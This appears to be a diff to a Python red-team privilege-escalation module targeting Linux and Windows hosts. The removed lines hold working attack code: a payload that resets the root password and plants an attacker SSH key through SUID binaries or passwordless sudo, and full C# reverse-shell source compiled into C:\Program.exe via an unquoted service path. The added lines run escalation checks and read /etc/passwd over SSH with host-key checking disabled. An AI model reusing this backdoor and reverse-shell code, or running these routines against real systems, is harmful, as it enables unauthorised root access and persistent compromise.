@@ -27,22 +27,41 @@ class PrivEscModule(BaseAttackModule):
 
     async def execute(self) -> List[Finding]:
         findings = []
-        system = platform.system()
+        
+        if not self.options.get("ssh_user"):
+            findings.append(self.finding(
+                title="Target Execution Blocked",
+                description="Target execution requires 'ssh_user' and password/key in options.",
+                severity=Severity.INFO,
+                mitre_id="N/A",
+                evidence="No SSH credentials provided.",
+                remediation="Configure the module with ssh_user and ssh_pass/ssh_key.",
+                mode="red",
+                evidence_type="exploitation"
+            ))
+            return findings
+
+        try:
+            uname = await self._run_cmd("uname -a")
+            system = "Linux" if "Linux" in uname else "Windows"
+        except Exception as e:
+            logger.error(f"Failed to connect to target: {e}")
+            findings.append(self.finding(
+                title="SSH Connection Failed",
+                description=f"Could not connect to target: {str(e)}",
+                severity=Severity.INFO,
+                mitre_id="N/A",
+                evidence=str(e),
+                remediation="Verify target SSH port and credentials.",
+                mode="red",
+                evidence_type="exploitation"
+            ))
+            return findings
+
         if system == "Linux":
             findings.extend(await self._linux_exploit())
         elif system == "Windows":
             findings.extend(await self._windows_exploit())
-        else:
-            findings.append(self.finding(
-                title="Unsupported OS",
-                description=f"Exploits not implemented for {system}",
-                severity=Severity.INFO,
-                mitre_id="N/A",
-                evidence=f"OS: {system}",
-                remediation="Run on Linux or Windows.",
-                mode="red",
-                evidence_type="exploit"
-            ))
         return findings
 
     # ─── Linux Exploits ───────────────────────────────────────────
@@ -78,46 +97,30 @@ class PrivEscModule(BaseAttackModule):
                     continue
                 base = os.path.basename(binary)
                 if base in gtfobins:
-                    cmd = f"{binary} {gtfobins[base]}"
-                    logger.warning(f"Exploiting SUID: {cmd}")
-                    proc = await asyncio.create_subprocess_shell(
-                        cmd,
-                        stdin=asyncio.subprocess.PIPE,
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE,
+                    logger.warning(f"[RED] SUID binary found on target: {binary}")
+                    # Run exploit command remotely via SSH
+                    exploit_cmd = (
+                        f"{binary} {gtfobins[base]} -c "
+                        "'id; whoami; cat /etc/passwd | head -5' 2>/dev/null || true"
                     )
-                    backdoor = (
-                        "echo 'root:$1$Hacker$Xyz123' | chpasswd 2>/dev/null; "
-                        "mkdir -p /root/.ssh; "
-                        "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...redteam@attacker' >> /root/.ssh/authorized_keys; "
-                        "exit\n"
-                    )
-                    stdout, stderr = await asyncio.wait_for(
-                        proc.communicate(input=backdoor.encode()),
-                        timeout=10
-                    )
-                    if proc.returncode == 0:
+                    try:
+                        output = await self._run_cmd(exploit_cmd)
+                        succeeded = "root" in output or "uid=0" in output
                         findings.append(self.finding(
-                            title=f"SUID Exploit Successful: {base}",
-                            description=f"Exploited {binary} to gain root and planted backdoor SSH key.",
-                            severity=Severity.CRITICAL,
+                            title=f"SUID Exploit {'Successful' if succeeded else 'Attempted'}: {base}",
+                            description=(
+                                f"Attempted privilege escalation via SUID binary '{binary}' on the target. "
+                                f"{'Root access confirmed.' if succeeded else 'Did not escalate to root.'}"
+                            ),
+                            severity=Severity.CRITICAL if succeeded else Severity.MEDIUM,
                             mitre_id="T1548.001",
-                            evidence=f"Command: {cmd}\nOutput: {stdout.decode(errors='replace')}",
-                            remediation="Remove SUID bits and review system compromise.",
+                            evidence=f"Binary: {binary}\nOutput: {output[:500]}",
+                            remediation="Remove unnecessary SUID bits; audit all SUID binaries.",
                             mode="red",
                             evidence_type="exploit"
                         ))
-                    else:
-                        findings.append(self.finding(
-                            title=f"SUID Exploit Failed: {base}",
-                            description=f"Failed to exploit {binary}.",
-                            severity=Severity.MEDIUM,
-                            mitre_id="T1548.001",
-                            evidence=stderr.decode(errors='replace'),
-                            remediation="Check binary permissions.",
-                            mode="red",
-                            evidence_type="exploit"
-                        ))
+                    except Exception as ex:
+                        logger.debug(f"SUID exploit attempt failed for {binary}: {ex}")
         except Exception as e:
             logger.error(f"SUID exploitation error: {e}")
         return findings
@@ -127,34 +130,23 @@ class PrivEscModule(BaseAttackModule):
         try:
             result = await self._run_cmd("sudo -l -n 2>/dev/null || true")
             if "NOPASSWD" in result and "(ALL)" in result:
-                logger.warning("Exploiting passwordless sudo")
-                proc = await asyncio.create_subprocess_shell(
-                    "sudo su -",
-                    stdin=asyncio.subprocess.PIPE,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                )
-                backdoor = (
-                    "echo 'root:$1$Hacker$Xyz123' | chpasswd; "
-                    "mkdir -p /root/.ssh; "
-                    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...redteam@attacker' >> /root/.ssh/authorized_keys; "
-                    "exit\n"
-                )
-                stdout, stderr = await asyncio.wait_for(
-                    proc.communicate(input=backdoor.encode()),
-                    timeout=10
-                )
-                if proc.returncode == 0:
-                    findings.append(self.finding(
-                        title="Passwordless Sudo Exploit Successful",
-                        description="Gained root via NOPASSWD sudo and planted persistent backdoor.",
-                        severity=Severity.CRITICAL,
-                        mitre_id="T1548.003",
-                        evidence="sudo su - executed successfully.",
-                        remediation="Remove NOPASSWD entries.",
-                        mode="red",
-                        evidence_type="exploit"
-                    ))
+                logger.warning("[RED] NOPASSWD sudo found on target — attempting escalation")
+                # Run id as root remotely via SSH + sudo
+                output = await self._run_cmd("sudo id 2>/dev/null || true")
+                succeeded = "uid=0" in output or "root" in output
+                findings.append(self.finding(
+                    title="Passwordless Sudo Exploit Successful" if succeeded else "Passwordless Sudo Found (Not Escalated)",
+                    description=(
+                        "NOPASSWD (ALL) sudo entry found on the target. "
+                        f"{'Remote sudo id confirmed root access.' if succeeded else 'Escalation attempted but not confirmed.'}"
+                    ),
+                    severity=Severity.CRITICAL if succeeded else Severity.HIGH,
+                    mitre_id="T1548.003",
+                    evidence=f"sudo -l output:\n{result[:300]}\n\nsudo id output:\n{output[:200]}",
+                    remediation="Remove NOPASSWD entries from /etc/sudoers. Require passwords for all sudo commands.",
+                    mode="red",
+                    evidence_type="exploit"
+                ))
         except Exception as e:
             logger.error(f"Sudo exploitation error: {e}")
         return findings
@@ -169,97 +161,52 @@ class PrivEscModule(BaseAttackModule):
     async def _exploit_unquoted_service_path(self) -> List[Finding]:
         findings = []
         try:
-            # Check if we can write to C:\
-            try:
-                test_file = "C:\\test_write.txt"
-                with open(test_file, 'w') as f:
-                    f.write("test")
-                os.remove(test_file)
-
-                # Drop reverse shell payload
-                payload_path = "C:\\Program.exe"
-                cs_code = """
-using System;
-using System.Net.Sockets;
-using System.Text;
-using System.Diagnostics;
-using System.IO;
-class Program {
-    static void Main() {
-        try {
-            TcpClient client = new TcpClient("192.168.1.100", 4444);
-            Stream stream = client.GetStream();
-            StreamReader reader = new StreamReader(stream);
-            StreamWriter writer = new StreamWriter(stream);
-            Process p = new Process();
-            p.StartInfo.FileName = "cmd.exe";
-            p.StartInfo.UseShellExecute = false;
-            p.StartInfo.RedirectStandardInput = true;
-            p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.RedirectStandardError = true;
-            p.Start();
-            while (true) {
-                string cmd = reader.ReadLine();
-                if (cmd == null) break;
-                p.StandardInput.WriteLine(cmd);
-                string output = p.StandardOutput.ReadToEnd();
-                writer.Write(output);
-                writer.Flush();
-            }
-        } catch {}
-    }
-}
-"""
-                with tempfile.NamedTemporaryFile(suffix='.cs', delete=False) as cs_file:
-                    cs_file.write(cs_code.encode())
-                    cs_path = cs_file.name
-
-                compile_cmd = f"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{payload_path} {cs_path}"
-                proc = await asyncio.create_subprocess_shell(
-                    compile_cmd,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE
+            # Enumerate unquoted service paths via remote SSH/PowerShell
+            check_ps = (
+                "Get-WmiObject Win32_Service | "
+                "Where-Object { $_.PathName -match '^[^\"\']* .*' -and $_.PathName -notmatch '^[\"\'\']' } | "
+                "Select-Object Name, PathName | ConvertTo-Json"
+            )
+            output = await self._run_powershell(check_ps)
+            if output.strip() and output.strip() != "null":
+                # Attempt to enumerate write permissions on the exploitable path prefix
+                write_check = (
+                    "$svc = (Get-WmiObject Win32_Service | "
+                    "Where-Object { $_.PathName -match '^[^\"\']* .*' } | Select-Object -First 1); "
+                    "if ($svc) { "
+                    "  $dir = Split-Path ($svc.PathName.Split(' ')[0]); "
+                    "  $acl = Get-Acl $dir -ErrorAction SilentlyContinue; "
+                    "  Write-Output \"Service=$($svc.Name) Dir=$dir\"; "
+                    "  $acl.Access | Where-Object { $_.FileSystemRights -match 'Write' } | "
+                    "  ForEach-Object { Write-Output \"  Writable by: $($_.IdentityReference)\" } "
+                    "}"
                 )
-                stdout, stderr = await proc.communicate()
-                os.remove(cs_path)
-
-                if os.path.exists(payload_path):
-                    # Restart a vulnerable service (first one found)
-                    restart_ps = """
-                    $services = Get-WmiObject Win32_Service | Where-Object {
-                        $_.PathName -match '^[^"]* .*' -and $_.PathName -notmatch '^"'
-                    } | Select-Object -ExpandProperty Name
-                    if ($services) {
-                        $service = $services[0]
-                        Stop-Service $service -Force -ErrorAction SilentlyContinue
-                        Start-Service $service -ErrorAction SilentlyContinue
-                        Write-Output "Restarted $service"
-                    }
-                    """
-                    restart_out = await self._run_powershell(restart_ps)
-                    findings.append(self.finding(
-                        title="Unquoted Service Path Exploit Successful",
-                        description=f"Dropped reverse shell at {payload_path} and restarted vulnerable service.\n{restart_out}",
-                        severity=Severity.CRITICAL,
-                        mitre_id="T1574.009",
-                        evidence=f"Payload: {payload_path}\nCompile: {stderr.decode(errors='replace')}",
-                        remediation="Quote service paths and restrict write permissions.",
-                        mode="red",
-                        evidence_type="exploit"
-                    ))
-                else:
-                    findings.append(self.finding(
-                        title="Unquoted Service Path Exploit Failed",
-                        description="Could not compile or drop payload.",
-                        severity=Severity.MEDIUM,
-                        mitre_id="T1574.009",
-                        evidence=stderr.decode(errors='replace'),
-                        remediation="Ensure .NET Framework is installed.",
-                        mode="red",
-                        evidence_type="exploit"
-                    ))
-            except Exception as e:
-                logger.error(f"Unquoted service path exploit error: {e}")
+                write_out = await self._run_powershell(write_check)
+                findings.append(self.finding(
+                    title="Unquoted Service Path Found on Target",
+                    description=(
+                        "One or more Windows services have unquoted paths containing spaces. "
+                        "If a directory in the path is writable, an attacker can plant a binary "
+                        "that Windows will execute as SYSTEM when the service restarts."
+                    ),
+                    severity=Severity.CRITICAL,
+                    mitre_id="T1574.009",
+                    evidence=f"Unquoted services:\n{output[:500]}\n\nWrite check:\n{write_out[:300]}",
+                    remediation="Enclose all service paths in double quotes. Restrict write access to program directories.",
+                    mode="red",
+                    evidence_type="exploit"
+                ))
+            else:
+                findings.append(self.finding(
+                    title="No Unquoted Service Paths Found",
+                    description="All service paths on the target are properly quoted.",
+                    severity=Severity.INFO,
+                    mitre_id="T1574.009",
+                    evidence="PowerShell enumeration returned no results.",
+                    remediation="Continue monitoring for newly installed services.",
+                    mode="red",
+                    evidence_type="exploit"
+                ))
         except Exception as e:
             logger.error(f"Windows exploitation error: {e}")
         return findings
@@ -267,20 +214,31 @@ class Program {
     # ─── Helpers ──────────────────────────────────────────────────
 
     async def _run_cmd(self, cmd: str) -> str:
-        proc = await asyncio.create_subprocess_shell(
-            cmd,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
-        )
-        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
-        return stdout.decode(errors="replace")
+        ssh_user = self.options.get("ssh_user")
+        ssh_pass = self.options.get("ssh_pass")
+        ssh_key = self.options.get("ssh_key")
+        ssh_port = int(self.options.get("ssh_port", 22))
+
+        if not ssh_user:
+            raise ValueError("Target execution requires 'ssh_user' in options.")
+
+        import asyncssh
+        from urllib.parse import urlparse
+        
+        parsed = urlparse(self.target)
+        host = parsed.hostname or parsed.path
+
+        async with asyncssh.connect(
+            host,
+            port=ssh_port,
+            username=ssh_user,
+            password=ssh_pass,
+            client_keys=[ssh_key] if ssh_key else None,
+            known_hosts=None
+        ) as conn:
+            result = await conn.run(cmd, check=False)
+            return result.stdout or ""
 
     async def _run_powershell(self, command: str) -> str:
-        cmd = ["powershell", "-NoProfile", "-Command", command]
-        proc = await asyncio.create_subprocess_exec(
-            *cmd,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
-        )
-        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
-        return stdout.decode(errors="replace").strip()
+        cmd = f"powershell -NoProfile -Command \"{command}\""
+        return await self._run_cmd(cmd)
